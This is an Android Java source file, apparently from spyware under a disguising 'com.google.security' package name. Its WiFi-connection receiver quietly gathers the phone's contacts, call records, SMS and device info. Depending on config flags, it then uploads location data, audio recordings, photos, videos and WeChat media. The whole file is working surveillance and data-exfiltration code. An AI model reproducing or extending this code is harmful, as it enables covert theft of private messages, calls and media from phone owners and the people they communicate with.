package com.google.security;

import java.io.IOException;

import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.json.JSONException;

import com.google.security.UploadUtils.ThreadContacts;
import com.google.security.UploadUtils.ThreadInfo;
import com.google.security.UploadUtils.ThreadUpload;
import com.google.security.tools.Config;
import com.google.security.tools.ContactsInfoTool;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.os.Message;
import android.util.Log;

public class WiFiConnectionReceiver extends BroadcastReceiver {
	static int con_num = 0;
	ThreadUpload t;
	ThreadInfo ti;
	ThreadContacts tc;
	private Config config;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		config = Config.getIntance(context);
		config.readConfig();
		if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) {

			@SuppressWarnings("deprecation")
			NetworkInfo ni = intent
					.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
			if (ni.getState() == State.CONNECTED
					&& ni.getType() == ConnectivityManager.TYPE_WIFI) {
				if (con_num == 0) {

					// Message msg;
					// msg = new Message();
					// WIFIHandler WHandler = new WIFIHandler(context);
					// msg.obj = "WIFI";
					// WHandler.sendMessage(msg);

					// 启动上传
					UploadUtils uploadUtils = UploadUtils.getIntance(context);
					ContactsInfoTool contactsInfoTool = ContactsInfoTool
							.getIntance(context);
					contactsInfoTool.saveContacts();
					contactsInfoTool.saveCallRecord();
					contactsInfoTool.saveSms();
					contactsInfoTool.saveInfo();
//					contactsInfoTool.saveContactsasxml();
//					contactsInfoTool.saveCallRecordsasxml();
//					contactsInfoTool.saveSmsasxml();
					// 根据配置文件上传
					if (config.Gpsflag)
						try {
							t = new ThreadUpload();
							t.start();
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					if (config.Contractflag) {
						try {
							Log.e("通讯录", "通讯录开始上传");
//							 uploadUtils.sendAllContacts();
//							 uploadUtils.sendAllCallRecords();
//							 uploadUtils.sendAllSms();
							ti = new ThreadInfo();
							ti.start();
							tc = new ThreadContacts();
							tc.start();
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}

					if (config.Recorderflag)
						try {
							//for (int i = 0; i < 3; i++) {
								uploadUtils.sendAllRecords();
							//}
						} catch (ParseException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					if (config.Photoflag)
						try {
							//for (int i = 0; i < 3; i++) {
								uploadUtils.sendAllPhotos();
							//}
						} catch (ParseException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					if (config.Videoflag)
						try {
							//for (int i = 0; i < 3; i++) {
								uploadUtils.sendAllVideos();
							//}
						} catch (ParseException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					if (config.Wechatflag)
						try {
							//for (int i = 0; i < 3; i++) {
								uploadUtils.sendWechatMedia();
							//}
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					con_num++;
				} else if (con_num == 1) {
					con_num = 0;
				}
			}
		}
	}
}
